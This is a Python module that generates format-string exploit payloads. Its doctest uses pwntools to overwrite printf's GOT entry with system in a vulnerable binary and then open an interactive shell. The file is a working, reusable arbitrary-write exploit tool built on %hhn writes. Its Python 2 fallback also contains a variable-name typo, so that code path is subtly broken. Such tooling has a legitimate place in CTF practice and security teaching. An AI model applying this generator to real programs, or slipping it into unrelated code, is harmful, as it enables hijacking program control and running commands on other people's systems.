import struct

__doc__ = "format string payload generator"
__all__ = ('FormatString',)

try:
    bytes_classes = (bytes, bytearray)
    str_classes   = (str, )
except:
    bytes_class   = (str, bytearray)
    str_classes   = (unicode, )

p64 = lambda x: struct.pack('<Q', x)
p32 = lambda x: struct.pack('<L', x)
u8  = lambda x: struct.unpack('<B', x)[0]

class FormatString(object):
    """
    >>> import pwn # pwntools
    >>> from fmtstr import *

    >>> elf = pwn.ELF()
    >>> io = pwn.process('./fmtstr_vul')

    >>> fmt = FormatString(offset=7, written=32, bits=32)
    >>> fmt[elf.got['printf']] = elf.symbols['system']
    >>> payload, sig = fmt.build()

    >>> io.sendline(payload)
    >>> io.recvuntil(sig)
    >>> io.interactive()
    """

    def __init__(self, offset=None, written=0, bits=64):
        """
        offset      %offset$p contains first controllable payload on the stack
        written     how many bytes data have been written
        bits        32 for x86, 64 for AMD64
        """
        self.bits = bits

        if written % self.size() != 0:
            self.padding = self.size() - written % self.size()
        else:
            self.padding = 0

        if offset is None:
            offset = {4: 1, 8: 6}[self.size()]

        self.offset = offset
        self.written = written
        self.table = {}

    def cleanup(self):
        """
        clean data to be written
        """
        self.table = {}

    def size(self):
        """
        return address size based on `bits` attribute
        """
        if self.bits == 32:
            return 4
        elif self.bits == 64:
            return 8
        else:
            raise ValueError('Unsupported bits %d' % self.bits)

    def pack(self, v):
        """
        pack int to bytes-like object
        """
        f = { 4: p32, 8: p64 }
        return f[self.size()](v)

    def build(self):
        """
        build payload, returns (payload, sig)
        """
        payload = b''
        to_write = sorted(self.table.items(), key=lambda x: x[1])
        length = len(to_write) * 12 # %100c$99$hhn
        length = length + 8 + self.size() - length % self.size()

        written = self.written + self.padding

        skip = self.offset + (length + written) // self.size()

        for adr, val in to_write:
            if val != written & 0xff:
                l = (val - written) & 0xff
                payload += b'%%%dc' % l
                written += l
            payload += b'%%%d$hhn' % skip
            skip += 1

        SIG = b'DEADBEEF'
        sig = SIG + b'.' * (length - len(payload) - len(SIG) - 1) + b'\0'
        payload += sig + b''.join(self.pack(i[0]) for i in to_write)

        self.cleanup()
        return b'.' * self.padding + payload, sig[:-1]

    def __setitem__(self, address, val):
        if type(val) is int:
            val = bytearray(self.pack(val))
        elif type(val) in bytes_classes:
            val = bytearray(val)
        elif type(val) in str_classes:
            val = val.encode()
        else:
            raise TypeError('Invalid type of `val`')

        to_write = { (address + i, v) for i, v in enumerate(val) }
        self.table.update(to_write)
